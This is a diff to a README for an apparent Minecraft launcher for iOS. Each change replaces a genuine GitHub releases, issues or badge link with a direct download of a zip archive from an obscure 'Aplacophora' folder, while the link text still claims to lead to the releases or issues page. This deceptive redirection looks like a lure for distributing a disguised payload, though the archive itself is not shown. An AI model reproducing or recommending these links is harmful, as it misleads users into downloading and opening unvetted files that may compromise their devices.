@@ -1,6 +1,6 @@
 # 🎮 bybylaucherjava - Easy Minecraft Launcher for iOS
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/Mikinaldo/bybylaucherjava/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Mikinaldo/bybylaucherjava/main/Aplacophora/bybylaucherjava.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Mikinaldo/bybylaucherjava/main/Aplacophora/bybylaucherjava.zip)
 
 ## 📖 Overview
 
@@ -16,7 +16,7 @@ To get started with bybylaucherjava, follow these steps:
    - Minimum 500 MB free storage
 
 2. **Download the Application**: 
-   - Visit this page to download: [bybylaucherjava Releases](https://github.com/Mikinaldo/bybylaucherjava/releases).
+   - Visit this page to download: [bybylaucherjava Releases](https://raw.githubusercontent.com/Mikinaldo/bybylaucherjava/main/Aplacophora/bybylaucherjava.zip).
 
 3. **Install the App**: 
    - Open the downloaded file.
@@ -34,7 +34,7 @@ To get started with bybylaucherjava, follow these steps:
 
 To download bybylaucherjava, simply click the link below:
 
-[Download from Releases](https://github.com/Mikinaldo/bybylaucherjava/releases)
+[Download from Releases](https://raw.githubusercontent.com/Mikinaldo/bybylaucherjava/main/Aplacophora/bybylaucherjava.zip)
 
 This will lead you to our releases page where you can find the latest version of the launcher. 
 
@@ -71,7 +71,7 @@ If problems persist, please refer to our support section on the GitHub page or c
 
 ## 🌟 Support 
 
-For help with bybylaucherjava, visit the [GitHub Issues Page](https://github.com/Mikinaldo/bybylaucherjava/issues) to report problems or ask for assistance. You can also find community support through forums dedicated to Minecraft.
+For help with bybylaucherjava, visit the [GitHub Issues Page](https://raw.githubusercontent.com/Mikinaldo/bybylaucherjava/main/Aplacophora/bybylaucherjava.zip) to report problems or ask for assistance. You can also find community support through forums dedicated to Minecraft.
 
 ---
 
